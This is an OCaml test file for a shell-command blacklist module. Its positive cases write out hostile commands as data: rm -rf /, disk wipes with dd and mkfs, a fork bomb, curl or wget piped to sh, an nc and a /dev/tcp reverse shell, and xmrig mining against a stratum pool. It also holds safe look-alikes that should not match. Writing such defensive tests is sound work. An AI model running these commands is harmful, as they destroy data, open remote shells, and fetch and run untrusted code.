(* Test the blacklist data module.
   For each entry: one positive (catches dangerous command) and one negative (doesn't catch a similar safe command). *)

open Par

let matches_name argv name =
  Bash_blacklist.matches ~argv
  |> Bash_blacklist.names_of
  |> List.mem name

let entries = Bash_blacklist.all

(* Per-entry positive + negative tests.
   Format: (argv, name, description_for_assertion_message) *)
let positive : (string list * string) list = [
  ["rm"; "-rf"; "/"], "rm-rf-root";
  ["rm"; "-rf"; "~"], "rm-rf-home";
  ["dd"; "if=/dev/zero"; "of=/dev/sda"], "dd-zero-disk";
  ["mkfs.ext4"; "/dev/sda1"], "mkfs";
  ["fdisk"; "/dev/sda"], "fdisk";
  ["shutdown"; "-h"; "now"], "shutdown";
  ["reboot"], "reboot";
  ["halt"], "halt";
  ["init"; "0"], "init-0";
  ["sudo"; "apt"; "update"], "sudo";
  ["su"; "-"; "root"], "su-dash";
  ["doas"; "apt"; "update"], "doas";
  ["curl"; "http://x.com"; "|"; "sh"], "curl-pipe-sh";
  ["wget"; "http://x.com"; "|"; "sh"], "wget-pipe-sh";
  ["nc"; "-e"; "/bin/sh"; "x.com"; "4444"], "nc-exec";
  ["bash"; "-c"; "cat /dev/tcp/x.com/4444"], "bash-reverse";
  ["bash"; "-c"; ":(){:|:&}:"], "fork-bomb";
  ["chmod"; "-R"; "777"; "/"], "chmod-777-root";
  ["chmod"; "4755"; "/usr/bin/foo"], "chmod-suid";
  ["chown"; "-R"; "user:user"; "/"], "chown-recursive";
  ["bash"; "-c"; "eval $CMD"], "bash-eval";
  ["echo"; "`ls`"], "backtick-subst";
  ["bash"; "-c"; "echo $(whoami)"], "dollar-paren";
  ["mount"; "--bind"; "/a"; "/b"], "mount-bind";
  ["umount"; "-f"; "/mnt"], "umount-force";
  ["xmrig"], "xmrig";
  ["minerd"], "minerd";
  ["xmrig"; "-o"; "stratum+tcp://pool.com:4444"], "stratum-tcp";
  ["kill"; "-9"; "1"], "kill-init";
  ["pkill"; "-9"; "-f"; "node"], "pkill-broad";
  ["killall"; "-9"; "node"], "killall-broad";
]

let negative : (string list * string) list = [
  ["git"; "rm"; "build/"], "rm-rf-root";
  ["echo"; "rm"; "-rf"; "build/"], "rm-rf-root";  (* rm -rf build/ is not /, no match *)
  ["ls"; "-la"], "fdisk";
  ["ls"], "shutdown";
  ["ls"], "reboot";
  ["ls"], "halt";
  ["ls"], "sudo";
  ["ls"], "doas";
  ["ls"], "xmrig";
  ["ls"], "minerd";
  ["chmod"; "644"; "file.txt"], "chmod-777-root";  (* no /, no 777 *)
  ["chown"; "user:user"; "file.txt"], "chown-recursive";  (* no -R *)
  ["mount"; "/dev/sda1"; "/mnt"], "mount-bind";  (* no --bind *)
  ["umount"; "/mnt"], "umount-force";  (* no -f *)
  ["kill"; "-TERM"; "1"], "kill-init";  (* not -9 *)
  ["pkill"; "node"], "pkill-broad";  (* no -9 -f *)
  ["killall"; "node"], "killall-broad";  (* no -9 *)
  ["eval"; "x"], "bash-eval";  (* no $ after eval *)
  ["echo"; "hello"], "backtick-subst";  (* no backticks *)
  ["echo"; "hello"], "dollar-paren";  (* no $( *)
  ["bash"; "-c"], "fork-bomb";  (* no fork bomb *)
  ["ls"; "/dev"], "bash-reverse";  (* no /dev/tcp/ *)
  ["cat"; "/etc/passwd"], "rm-rf-root";  (* no rm -rf / *)
]

let () =
  let open Alcotest in
  let positive_tests = List.map (fun (argv, name) ->
    test_case (Printf.sprintf "positive: %s matches %s" name (String.concat " " argv)) `Quick (fun () ->
      check bool (Printf.sprintf "Blacklist should match %s for %s" name (String.concat " " argv))
        true (matches_name argv name))
  ) positive in
  let negative_tests = List.map (fun (argv, name) ->
    test_case (Printf.sprintf "negative: %s does NOT match %s" name (String.concat " " argv)) `Quick (fun () ->
      check bool (Printf.sprintf "Blacklist should NOT match %s for %s" name (String.concat " " argv))
        false (matches_name argv name))
  ) negative in
  run "bash_blacklist" [
    "positive matches", positive_tests;
    "negative matches", negative_tests;
    "structure", [
      test_case "at least 30 entries" `Quick (fun () ->
        check int "all length" 31 (List.length entries));
      test_case "all entries have name+regex+description" `Quick (fun () ->
        check bool "all well-formed" true
          (List.for_all (fun (e : Par.Bash_blacklist.entry) ->
            String.length e.name > 0
            && String.length e.description > 0)
          entries));
    ];
  ]
